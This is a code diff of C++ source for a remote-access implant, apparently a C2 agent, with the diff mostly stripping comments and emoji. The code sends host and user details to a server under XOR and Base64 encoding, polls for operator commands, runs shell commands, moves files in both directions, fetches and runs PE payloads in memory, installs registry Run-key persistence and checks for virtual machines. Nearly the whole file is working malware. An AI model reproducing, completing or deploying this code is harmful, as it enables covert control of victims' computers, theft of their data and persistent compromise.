@@ -19,9 +19,7 @@ using namespace std;
 extern "C" bool is_virtual_machine();
 #endif
 
-// Helper function to parse types and value from command
 void parse_command_type(const string& command, string& types, string& value) {
-    // Chercher le pattern 'type':'value'
     size_t sep1 = command.find('\'');
     if (sep1 == string::npos) {
         types = "cmd";
@@ -38,7 +36,6 @@ void parse_command_type(const string& command, string& types, string& value) {
 
     types = command.substr(sep1 + 1, sep2 - sep1 - 1);
 
-    // Chercher le séparateur ':'
     size_t colon = command.find(':', sep2);
     if (colon == string::npos) {
         types = "cmd";
@@ -65,26 +62,20 @@ void parse_command_type(const string& command, string& types, string& value) {
     }
 }
 
-// Helper function to extract filename from download command
 string extract_filename(const string& command_type, const string& command_value) {
     if (command_type != "download") {
         return "";
     }
 
-    // For download commands, the value is the filename
     return command_value;
 }
 
-/**
- * Envoie un beacon initial au C2 (check-in)
- * Route: POST /api/update (ou RESULTS_PATH configuré)
- */
+
 string send_beacon(const string& agent_id, const string& results_data = "") {
     string hostname = get_hostname();
     string username = get_username();
     string process_name = get_process_name();
     string ip_pub = getPublicIP();
-    // Construire le JSON de beacon
     ostringstream ss;
     ss << "{";
     ss << "\"agent_id\":\"" << agent_id << "\",";
@@ -101,17 +92,14 @@ string send_beacon(const string& agent_id, const string& results_data = "") {
     cout << "[BEACON] JSON: " << beacon_json << endl;
     #endif
 
-    // Chiffrer avec XOR
     string xor_encrypted = xor_data(beacon_json, XOR_KEY);
 
-    // Encoder en Base64
     string b64_encoded = base64_encode(xor_encrypted);
 
     #ifdef _DEBUG
     cout << "[BEACON] Sending to " << XOR_SERVERS << ":" << XOR_PORT << RESULTS_PATH << endl;
     #endif
 
-    // Envoyer le beacon
     string response = http_post(
         XOR_SERVERS,
         XOR_PORT,
@@ -125,30 +113,22 @@ string send_beacon(const string& agent_id, const string& results_data = "") {
     return response;
 }
 
-/**
- * Récupère les commandes en attente
- * Route: POST /api/command
- * Retourne: {"success":true,"commands":[{"id":1,"command":"'cmd':'whoami'"},{"id":2,"command":"..."}]}
- */
+
 vector<pair<int64_t, string>> fetch_commands(const string& agent_id) {
     vector<pair<int64_t, string>> commands;
 
-    // Construire la requête JSON
     ostringstream ss;
     ss << "{\"agent_id\":\"" << agent_id << "\"}";
     string request_json = ss.str();
 
-    // Chiffrer XOR
     string xor_encrypted = xor_data(request_json, XOR_KEY);
 
-    // Encoder Base64
     string b64_encoded = base64_encode(xor_encrypted);
 
     #ifdef _DEBUG
     cout << "[COMMAND] Fetching commands from /api/command" << endl;
     #endif
 
-    // Envoyer la requête
     string response = http_post(
         XOR_SERVERS,
         XOR_PORT,
@@ -166,25 +146,20 @@ vector<pair<int64_t, string>> fetch_commands(const string& agent_id) {
         return commands;
     }
 
-    // Décoder Base64
     string xor_response = base64_decode(response);
 
-    // Décrypter XOR
     string clear_response = xor_data(xor_response, XOR_KEY);
 
     #ifdef _DEBUG
     cout << "[COMMAND] Response: " << clear_response << endl;
     #endif
 
-    // Parser le JSON manuellement pour extraire les commandes avec leurs IDs
-    // Format: {"success":true,"commands":[{"id":1,"command":"'cmd':'whoami'"},{"id":2,"command":"..."}]}
-
     size_t commands_pos = clear_response.find("\"commands\":[");
     if (commands_pos == string::npos) {
         return commands;
     }
 
-    size_t pos = commands_pos + 12; // skip "commands":[
+    size_t pos = commands_pos + 12;
 
     while (pos < clear_response.length()) {
         // Skip whitespace
@@ -197,16 +172,13 @@ vector<pair<int64_t, string>> fetch_commands(const string& agent_id) {
             continue;
         }
 
-        // Trouver l'objet {"id":...,"command":"..."}
         if (clear_response[pos] == '{') {
-            pos++; // skip {
+            pos++;
 
             int64_t cmd_id = -1;
             string cmd_text = "";
 
-            // Parser l'objet
             while (pos < clear_response.length() && clear_response[pos] != '}') {
-                // Skip whitespace
                 while (pos < clear_response.length() && (clear_response[pos] == ' ' || clear_response[pos] == '\t')) pos++;
 
                 if (clear_response[pos] == ',') {
@@ -214,22 +186,17 @@ vector<pair<int64_t, string>> fetch_commands(const string& agent_id) {
                     continue;
                 }
 
-                // Lire "id":
                 if (clear_response.substr(pos, 5) == "\"id\":") {
                     pos += 5;
-                    // Skip whitespace
                     while (pos < clear_response.length() && (clear_response[pos] == ' ' || clear_response[pos] == '\t')) pos++;
 
-                    // Lire le nombre
                     size_t end = pos;
                     while (end < clear_response.length() && isdigit(clear_response[end])) end++;
                     cmd_id = atoll(clear_response.substr(pos, end - pos).c_str());
                     pos = end;
                 }
-                // Lire "command":
                 else if (clear_response.substr(pos, 11) == "\"command\":\"") {
                     pos += 11;
-                    // Lire jusqu'au prochain "
                     size_t end = pos;
                     while (end < clear_response.length()) {
                         if (clear_response[end] == '\\') {
@@ -253,7 +220,7 @@ vector<pair<int64_t, string>> fetch_commands(const string& agent_id) {
                 #endif
             }
 
-            pos++; // skip }
+            pos++;
         } else {
             pos++;
         }
@@ -275,7 +242,6 @@ string fetch_pe_data(int64_t command_id) {
     cout << "[PE-DATA] Fetching from: " << XOR_SERVERS << ":" << XOR_PORT << path << endl;
     #endif
 
-    // Faire une requête GET
     string response = http_get(
         XOR_SERVERS,
         XOR_PORT,
@@ -296,13 +262,12 @@ string fetch_pe_data(int64_t command_id) {
     cout << "[PE-DATA] Response length: " << response.length() << " bytes" << endl;
     #endif
 
-    // Décoder Base64 externe
     string xor_encrypted;
     try {
         xor_encrypted = base64_decode(response);
     } catch (const exception& e) {
         #ifdef _DEBUG
-        cerr << "[PE-DATA] ❌ Base64 decode failed: " << e.what() << endl;
+        cerr << "[PE-DATA] Base64 decode failed: " << e.what() << endl;
         #endif
         return "";
     }
@@ -311,25 +276,18 @@ string fetch_pe_data(int64_t command_id) {
     cout << "[PE-DATA] XOR encrypted length: " << xor_encrypted.length() << " bytes" << endl;
     #endif
 
-    // Déchiffrer XOR
     string decrypted = xor_data(xor_encrypted, XOR_KEY);
 
     #ifdef _DEBUG
-    cout << "[PE-DATA] ✅ Decrypted length: " << decrypted.length() << " bytes" << endl;
+    cout << "[PE-DATA] Decrypted length: " << decrypted.length() << " bytes" << endl;
     #endif
 
     return decrypted;
 }
-/**
- * Soumet les résultats d'une commande
- * Route: POST /api/result
- * Body: {"agent_id":"...","command_id":123,"output":"base64_result","success":true,"types":"cmd","filename":"optional"}
- */
+
 bool submit_result(const string& agent_id, int64_t command_id, const string& output, bool success, const string& types, const string& filename = "") {
-    // Encoder le résultat en Base64
     string output_b64 = base64_encode(output);
 
-    // Construire le JSON de résultat
     ostringstream ss;
     ss << "{";
     ss << "\"agent_id\":\"" << agent_id << "\",";
@@ -349,13 +307,10 @@ bool submit_result(const string& agent_id, int64_t command_id, const string& out
     cout << "[RESULT] Submitting result for command " << command_id << endl;
     #endif
 
-    // Chiffrer XOR
     string xor_encrypted = xor_data(result_json, XOR_KEY);
 
-    // Encoder Base64
     string b64_encoded = base64_encode(xor_encrypted);
 
-    // Envoyer
     string response = http_post(
         XOR_SERVERS,
         XOR_PORT,
@@ -392,13 +347,11 @@ void agent_run() {
     }
     #endif
 
-    // ===== AUTO-PERSISTENCE (MITRE T1547.001) =====
-    // Install persistence on first run (Registry Run Key + copy to AppData)
     if (!is_persistence_installed()) {
         #ifdef _DEBUG
         cout << "[*] Installing persistence..." << endl;
         #endif
-        
+
         if (install_persistence()) {
             #ifdef _DEBUG
             cout << "[+] Persistence installed successfully" << endl;
@@ -424,14 +377,12 @@ void agent_run() {
     cout << "[*] Beacon path: " << RESULTS_PATH << endl;
     #endif
 
-    // Générer l'agent_id
     string agent_id = generate_agent_id();
 
     #ifdef _DEBUG
     cout << "[*] Agent ID: " << agent_id << endl;
     #endif
 
-    // Premier beacon d'enregistrement
     #ifdef _DEBUG
     cout << "[*] Sending initial check-in..." << endl;
     #endif
@@ -448,16 +399,13 @@ void agent_run() {
         #endif
     }
 
-    // Boucle principale
     while (true) {
-        // Attendre l'intervalle
         this_thread::sleep_for(chrono::seconds(BEACON_INTERVAL));
 
         #ifdef _DEBUG
         cout << "\n[*] ===== New Beacon Cycle =====" << endl;
         #endif
 
-        // Étape 1: Envoyer un beacon simple (heartbeat)
         #ifdef _DEBUG
         cout << "[*] Step 1: Sending heartbeat beacon..." << endl;
         #endif
@@ -471,7 +419,6 @@ void agent_run() {
             continue;
         }
 
-        // Étape 2: Récupérer les commandes via /api/command
         #ifdef _DEBUG
         cout << "[*] Step 2: Fetching commands..." << endl;
         #endif
@@ -484,7 +431,6 @@ void agent_run() {
             continue;
         }
 
-        // Étape 3: Exécuter chaque commande
         #ifdef _DEBUG
         cout << "[*] Step 3: Executing " << commands.size() << " command(s)..." << endl;
         #endif
@@ -511,7 +457,6 @@ void agent_run() {
                 cout << "[PE-EXEC] Fetching PE data from server..." << endl;
                 #endif
 
-                // Récupérer les données PE depuis le serveur
                 string pe_data_json = fetch_pe_data(cmd_id);
 
                 if (pe_data_json.empty()) {
@@ -524,7 +469,7 @@ void agent_run() {
                     #endif
                 } else {
                     #ifdef _DEBUG
-                    cout << "[PE-EXEC] ✅ PE data received (" << pe_data_json.length() << " bytes)" << endl;
+                    cout << "[PE-EXEC] PE data received (" << pe_data_json.length() << " bytes)" << endl;
                     cout << "[PE-EXEC] Executing PE in memory..." << endl;
                     #endif
 
@@ -532,7 +477,6 @@ void agent_run() {
                         result = handle_pe_exec(pe_data_json);
                         result_type = "text";
 
-                        // Vérifier si l'exécution a réussi
                         if (result.empty()) {
                             result = "Error: PE execution returned no output";
                             success = false;
@@ -544,7 +488,7 @@ void agent_run() {
                         } else {
                             success = true;
                             #ifdef _DEBUG
-                            cout << "[PE-EXEC] ✅ Execution successful" << endl;
+                            cout << "[PE-EXEC] Execution successful" << endl;
                             cout << "[PE-EXEC] Output length: " << result.length() << " bytes" << endl;
                             #endif
                         }
@@ -559,7 +503,6 @@ void agent_run() {
                     }
                 }
             }
-            // ===== TRAITEMENT CMD =====
             else if (cmd_type == "cmd") {
                 #ifdef _DEBUG
                 cout << "[CMD] Executing: " << cmd_value << endl;
@@ -572,7 +515,6 @@ void agent_run() {
                 cout << "[CMD] Output length: " << result.length() << " bytes" << endl;
                 #endif
             }
-            // ===== TRAITEMENT DOWNLOAD =====
             else if (cmd_type == "download") {
                 #ifdef _DEBUG
                 cout << "[DOWNLOAD] Downloading file: " << cmd_value << endl;
@@ -592,7 +534,6 @@ void agent_run() {
                     #endif
                 }
             }
-            // ===== TRAITEMENT UPLOAD =====
             else if (cmd_type == "upload") {
                 #ifdef _DEBUG
                 cout << "[UPLOAD] Processing upload command" << endl;
@@ -612,7 +553,6 @@ void agent_run() {
                     #endif
                 }
             }
-            // ===== COMMANDE INCONNUE =====
             else {
                 result = "Error: Unknown command type: " + cmd_type;
                 result_type = "text";
@@ -623,7 +563,6 @@ void agent_run() {
                 #endif
             }
 
-            // ===== SOUMETTRE LE RÉSULTAT =====
             #ifdef _DEBUG
             cout << "[RESULT] Submitting result for command " << cmd_id << endl;
             cout << "[RESULT] Success: " << (success ? "true" : "false") << endl;
@@ -650,9 +589,6 @@ void agent_run() {
     }
 }
 
-/**
- * Point d'entrée
- */
 int main() {
     try {
         agent_run();
